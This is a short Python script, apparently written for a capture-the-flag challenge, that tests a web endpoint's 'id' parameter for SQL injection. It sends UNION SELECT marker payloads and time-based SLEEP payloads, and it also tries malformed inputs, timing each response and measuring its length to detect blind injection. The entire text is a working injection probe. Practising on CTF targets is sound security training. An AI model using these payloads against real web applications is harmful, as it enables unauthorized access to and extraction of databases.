import requests, time
b='https://f6567e92343e20f4.chal.ctf.ae/'
def get(id, timeout=90):
    t=time.time()
    r=requests.get(b, params={'id':id}, timeout=timeout)
    return round(time.time()-t,2), len(r.content), r.text

# 1) marker union - does injected data appear ANYWHERE?
dt,ln,txt = get("1 UNION SELECT 0x4d41524b4552595959")
print("union marker: time",dt,"len",ln,"MARKER in body?", "MARKERYYY" in txt or "4d41524b" in txt.lower())

# 2) precise long sleep with generous timeout
for n in [7]:
    dt,ln,txt = get(f"1 AND SLEEP({n})")
    print(f"AND SLEEP({n}): time",dt,"len",ln)
    dt,ln,txt = get(f"1 UNION SELECT SLEEP({n})")
    print(f"UNION SLEEP({n}): time",dt,"len",ln)

# 3) valid vs error status difference
for p in ["1", "1 AND 1=1", "@@@", "1 UNION SELECT 1,2,3"]:
    dt,ln,txt=get(p)
    print(repr(p), "->", dt, ln)
